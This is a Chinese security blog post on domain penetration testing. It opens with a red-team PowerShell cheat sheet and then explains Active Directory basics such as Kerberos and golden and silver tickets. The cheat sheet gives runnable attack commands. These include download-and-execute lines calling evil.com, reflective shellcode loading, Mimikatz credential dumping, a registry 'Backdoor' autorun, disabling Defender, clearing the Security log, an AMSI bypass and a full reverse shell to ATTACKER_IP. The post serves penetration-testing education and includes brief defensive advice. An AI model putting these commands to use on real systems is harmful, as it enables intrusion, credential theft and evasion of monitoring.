1.05rem;">esxi<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/html/" style="font-size: 1.05rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 1.05rem;">javascript<sup>1</sup></a><a href="/tags/nas/" style="font-size: 1.05rem;">nas<sup>1</sup></a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.05rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 1.05rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">云安全<sup>2</sup></a><a href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" style="font-size: 1.05rem;">人工智能<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>16</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>1</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 1.05rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 1.05rem;">密码<sup>8</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 1.05rem;">权限提升<sup>2</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 1.05rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 1.05rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 1.05rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 1.05rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 1.05rem;">证书<sup>1</sup></a><a href="/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">软件开发<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">十月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">九月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>操作系统</span></a><a class="article-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>横向移动</span></a><a class="article-meta__tags" href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>认证机制</span></a><a class="article-meta__tags" href="/tags/kerberos/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>kerberos</span></a><a class="article-meta__tags" href="/tags/NTLM/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>NTLM</span></a><a class="article-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>域渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">ADAPT域渗透测试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-03-15T16:00:00.000Z" title="发表于 2025-03-16 00:00:00">2025-03-16</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-06-03T16:25:14.828Z" title="更新于 2025-06-04 00:25:14">2025-06-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">21k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>76分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="ADAPT域渗透测试"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/80cb39dbb6fd526671943aeea318972bd5073688.png?x-oss-process=style/img-to-webp"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/61927/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" tabindex="-1" itemprop="url">操作系统</a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" tabindex="-1" itemprop="url">横向移动</a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" tabindex="-1" itemprop="url">认证机制</a><a href="/tags/kerberos/" tabindex="-1" itemprop="url">kerberos</a><a href="/tags/NTLM/" tabindex="-1" itemprop="url">NTLM</a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">域渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">ADAPT域渗透测试</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2025-03-15T16:00:00.000Z" title="发表于 2025-03-16 00:00:00">2025-03-16</time><time itemprop="dateCreated datePublished" datetime="2025-06-03T16:25:14.828Z" title="更新于 2025-06-04 00:25:14">2025-06-04</time></header><p>在渗透测试红队中，PowerShell 是一个强大的工具，因其深度集成于 Windows 系统且灵活性高，常用于信息收集、权限提升、横向移动和持久化攻击。以下是 PowerShell 的基础知识和红队常用技巧：</p>
<hr>
<h1 id="一、红队PowerShell"><a href="#一、红队PowerShell" class="headerlink" title="一、红队PowerShell"></a>一、红队PowerShell</h1><h2 id="1-PowerShell-基础"><a href="#1-PowerShell-基础" class="headerlink" title="1. PowerShell 基础"></a><strong>1. PowerShell 基础</strong></h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h3><ul>
<li>**PowerShell (PS)**：基于 .NET 的脚本语言和命令行工具，支持自动化任务和系统管理。</li>
<li><strong>Cmdlet</strong>：PowerShell 内置命令（如 <code>Get-Process</code>、<code>Copy-Item</code>）。</li>
<li><strong>脚本文件</strong>：扩展名为 <code>.ps1</code>，可通过命令行执行。</li>
<li><strong>执行策略</strong>：控制脚本运行权限，默认限制严格（<code>Restricted</code>）。</li>
</ul>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><ul>
<li><strong>执行脚本</strong>：<code>powershell -ExecutionPolicy Bypass -File script.ps1</code></li>
<li><strong>绕过执行策略</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ep</span> bypass</span><br></pre></td></tr></table></figure></li>
<li><strong>远程下载并执行</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://evil.com/script.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-红队常用-PowerShell-模块"><a href="#2-红队常用-PowerShell-模块" class="headerlink" title="2. 红队常用 PowerShell 模块"></a><strong>2. 红队常用 PowerShell 模块</strong></h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h3><ul>
<li><strong>系统信息</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ComputerInfo</span></span><br><span class="line"><span class="built_in">Get-LocalUser</span></span><br><span class="line"><span class="built_in">Get-NetIPConfiguration</span></span><br></pre></td></tr></table></figure></li>
<li><strong>网络探测</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-Port</span> <span class="number">445</span></span><br></pre></td></tr></table></figure></li>
<li><strong>域环境信息</strong>（需 Active Directory 模块）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name</span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> *</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a><strong>权限提升</strong></h3><ul>
<li><p><strong>利用服务权限</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create EvilService binPath= <span class="string">&quot;cmd /c C:\evil.exe&quot;</span></span><br><span class="line">sc.exe <span class="built_in">start</span> EvilService</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Token 窃取</strong>（需管理员权限）：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-TokenManipulation</span> <span class="literal">-ImpersonateUser</span> <span class="literal">-Username</span> <span class="string">&quot;Administrator&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a><strong>横向移动</strong></h3><ul>
<li><strong>PsExec 替代</strong>（<code>Invoke-Command</code>）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123; whoami &#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>WMI 远程执行</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ArgumentList</span> <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a><strong>持久化</strong></h3><ul>
<li><strong>计划任务</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn <span class="string">&quot;EvilTask&quot;</span> /tr <span class="string">&quot;C:\evil.exe&quot;</span> /<span class="built_in">sc</span> DAILY</span><br></pre></td></tr></table></figure></li>
<li><strong>注册表启动项</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;Backdoor&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\evil.exe&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="3-绕过安全检测"><a href="#3-绕过安全检测" class="headerlink" title="3. 绕过安全检测"></a><strong>3. 绕过安全检测</strong></h2><h3 id="混淆与编码"><a href="#混淆与编码" class="headerlink" title="混淆与编码"></a><strong>混淆与编码</strong></h3><ul>
<li><strong>Base64 编码命令</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Write-Host &#x27;Hello, Red Team!&#x27;&quot;</span></span><br><span class="line"><span class="variable">$encoded</span> = [<span class="type">Convert</span>]::ToBase64String([<span class="type">Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>))</span><br><span class="line">powershell <span class="literal">-EncodedCommand</span> <span class="variable">$encoded</span></span><br></pre></td></tr></table></figure></li>
<li><strong>代码混淆工具</strong>：<ul>
<li><strong>Invoke-Obfuscation</strong>：混淆脚本以绕过杀软签名检测。</li>
<li><strong>Chameleon</strong>：针对 AMSI（反恶意软件扫描接口）的绕过。</li>
</ul>
</li>
</ul>
<h3 id="无文件攻击"><a href="#无文件攻击" class="headerlink" title="无文件攻击"></a><strong>无文件攻击</strong></h3><ul>
<li><strong>内存加载 DLL&#x2F;EXE</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bytes</span> = (<span class="built_in">Invoke-WebRequest</span> <span class="string">&quot;http://evil.com/shellcode.bin&quot;</span>).Content</span><br><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEBytes</span> <span class="variable">$bytes</span></span><br></pre></td></tr></table></figure></li>
<li><strong>PowerShell 反射注入</strong>（使用 <code>Mimikatz</code>）：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-Command</span> <span class="string">&#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="4-防御规避"><a href="#4-防御规避" class="headerlink" title="4. 防御规避"></a><strong>4. 防御规避</strong></h2><ul>
<li><strong>禁用日志记录</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure></li>
<li><strong>清除事件日志</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Security</span><br></pre></td></tr></table></figure></li>
<li><strong>绕过 AMSI</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="5-实战工具推荐"><a href="#5-实战工具推荐" class="headerlink" title="5. 实战工具推荐"></a><strong>5. 实战工具推荐</strong></h2><ul>
<li><strong>PowerSploit</strong>：渗透测试框架（信息收集、权限提升、持久化）。</li>
<li><strong>Nishang</strong>：专为红队设计的脚本集（反向 Shell、键盘记录）。</li>
<li><strong>Empire</strong>：C2 框架，支持 PowerShell 后门。</li>
<li><strong>Cobalt Strike</strong>：集成 PowerShell 攻击链。</li>
</ul>
<hr>
<h2 id="6-防御建议"><a href="#6-防御建议" class="headerlink" title="6. 防御建议"></a><strong>6. 防御建议</strong></h2><ul>
<li><strong>限制 PowerShell 执行策略</strong>（如 <code>AllSigned</code>）。</li>
<li><strong>启用 PowerShell 日志记录</strong>（脚本块日志、模块日志）。</li>
<li><strong>监控敏感命令</strong>（如 <code>DownloadString</code>、<code>IEX</code>）。</li>
<li><strong>使用 AppLocker</strong> 或 <strong>WDAC</strong> 限制脚本执行。</li>
</ul>
<hr>
<h2 id="7-示例：反向-Shell"><a href="#7-示例：反向-Shell" class="headerlink" title="7. 示例：反向 Shell"></a><strong>7. 示例：反向 Shell</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;ATTACKER_IP&quot;</span>, <span class="number">4444</span>)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line">[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span> | %&#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>,<span class="variable">$i</span>)</span><br><span class="line">    <span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> )</span><br><span class="line">    <span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">    <span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>)</span><br><span class="line">    <span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length)</span><br><span class="line">    <span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>

<hr>
<p>掌握 PowerShell 基础后，可结合工具和实战场景深入探索其在红队中的灵活应用。注意合法授权和道德规范！</p>
<h1 id="二、AD域基础知识"><a href="#二、AD域基础知识" class="headerlink" title="二、AD域基础知识"></a>二、AD域基础知识</h1><h2 id="Active-Directory-AD-域基础知识"><a href="#Active-Directory-AD-域基础知识" class="headerlink" title="Active Directory (AD) 域基础知识"></a><strong>Active Directory (AD) 域基础知识</strong></h2><p>Active Directory（AD）是微软开发的目录服务，用于管理 Windows 网络环境中的用户、计算机、组和其他资源。AD 域是企业网络的核心，理解其基础架构是渗透测试和红队行动的关键。</p>
<hr>
<h2 id="1-AD-核心概念"><a href="#1-AD-核心概念" class="headerlink" title="1. AD 核心概念"></a><strong>1. AD 核心概念</strong></h2><h3 id="1-1-域（Domain）"><a href="#1-1-域（Domain）" class="headerlink" title="1.1 域（Domain）"></a><strong>1.1 域（Domain）</strong></h3><ul>
<li><strong>定义</strong>：逻辑安全边界，包含用户、计算机、组等对象，共享同一套安全策略和数据库。</li>
<li><strong>域控制器（DC, Domain Controller）</strong>：<ul>
<li>存储 AD 数据库（<code>NTDS.dit</code>）的服务器，负责用户认证和策略执行。</li>
<li>一个域可以有多个 DC，通过复制同步数据。</li>
</ul>
</li>
<li><strong>域用户与计算机</strong>：<ul>
<li>用户账号（User Account）：唯一标识（如 <code>user@domain.com</code>）。</li>
<li>计算机账号（Computer Account）：每台加入域的计算机自动创建。</li>
</ul>
</li>
</ul>
<h3 id="1-2-林（Forest）与树（Tree）"><a href="#1-2-林（Forest）与树（Tree）" class="headerlink" title="1.2 林（Forest）与树（Tree）"></a><strong>1.2 林（Forest）与树（Tree）</strong></h3><ul>
<li><strong>林</strong>：多个域的集合，共享全局编录（Global Catalog）和架构（Schema）。<ul>
<li><strong>根域</strong>：林中第一个创建的域。</li>
<li><strong>信任关系</strong>：林内域默认双向信任，林间需手动配置。</li>
</ul>
</li>
<li><strong>树</strong>：具有连续 DNS 命名空间的域（如 <code>parent.com</code> 和 <code>child.parent.com</code>）。</li>
</ul>
<h3 id="1-3-组织单位（OU-Organizational-Unit）"><a href="#1-3-组织单位（OU-Organizational-Unit）" class="headerlink" title="1.3 组织单位（OU, Organizational Unit）"></a><strong>1.3 组织单位（OU, Organizational Unit）</strong></h3><ul>
<li><strong>作用</strong>：用于逻辑分组管理对象（用户、计算机等），可嵌套。</li>
<li><strong>组策略（GPO, Group Policy Object）</strong>：<ul>
<li>通过 GPO 向 OU 内的对象下发策略（如密码策略、软件安装）。</li>
</ul>
</li>
</ul>
<h3 id="1-4-关键角色（FSMO-Roles）"><a href="#1-4-关键角色（FSMO-Roles）" class="headerlink" title="1.4 关键角色（FSMO Roles）"></a><strong>1.4 关键角色（FSMO Roles）</strong></h3><p>AD 中有 5 个灵活单主机操作角色（Flexible Single Master Operations）：</p>
<ol>
<li><strong>Schema Master</strong>：管理 AD 架构。</li>
<li><strong>Domain Naming Master</strong>：管理域的增加&#x2F;删除。</li>
<li><strong>PDC Emulator</strong>：时间同步、密码策略主控。</li>
<li><strong>RID Master</strong>：分配安全标识符（SID）中的 RID。</li>
<li><strong>Infrastructure Master</strong>：维护跨域对象引用。</li>
</ol>
<hr>
<h2 id="2-AD-核心服务"><a href="#2-AD-核心服务" class="headerlink" title="2. AD 核心服务"></a><strong>2. AD 核心服务</strong></h2><h3 id="2-1-DNS"><a href="#2-1-DNS" class="headerlink" title="2.1 DNS"></a><strong>2.1 DNS</strong></h3><ul>
<li><strong>作用</strong>：解析域名与 IP，AD 依赖 DNS 定位域控制器和服务。</li>
<li><strong>SRV 记录</strong>：记录域控制器的服务（如 <code>_ldap._tcp.dc._msdcs.domain.com</code>）。</li>
</ul>
<h3 id="2-2-LDAP（轻量级目录访问协议）"><a href="#2-2-LDAP（轻量级目录访问协议）" class="headerlink" title="2.2 LDAP（轻量级目录访问协议）"></a><strong>2.2 LDAP（轻量级目录访问协议）</strong></h3><ul>
<li><strong>端口</strong>：默认 389（明文）和 636（SSL）。</li>
<li><strong>功能</strong>：查询和修改 AD 对象（如用户、组）。</li>
<li><strong>基本 DN 结构</strong>：<code>DC=domain,DC=com</code>。</li>
</ul>
<h3 id="2-3-Kerberos-认证"><a href="#2-3-Kerberos-认证" class="headerlink" title="2.3 Kerberos 认证"></a><strong>2.3 Kerberos 认证</strong></h3><ul>
<li><strong>流程</strong>：<ol>
<li>用户向 KDC（Key Distribution Center）请求 TGT（Ticket Granting Ticket）。</li>
<li>使用 TGT 请求服务票据（Service Ticket）。</li>
<li>服务票据用于访问资源（如文件服务器）。</li>
</ol>
</li>
<li><strong>关键漏洞</strong>：<ul>
<li><strong>黄金票据（Golden Ticket）</strong>：伪造 TGT（需域管理员哈希）。</li>
<li><strong>白银票据（Silver Ticket）</strong>：伪造服务票据（需服务账号哈希）。</li>
</ul>
</li>
</ul>
<hr>
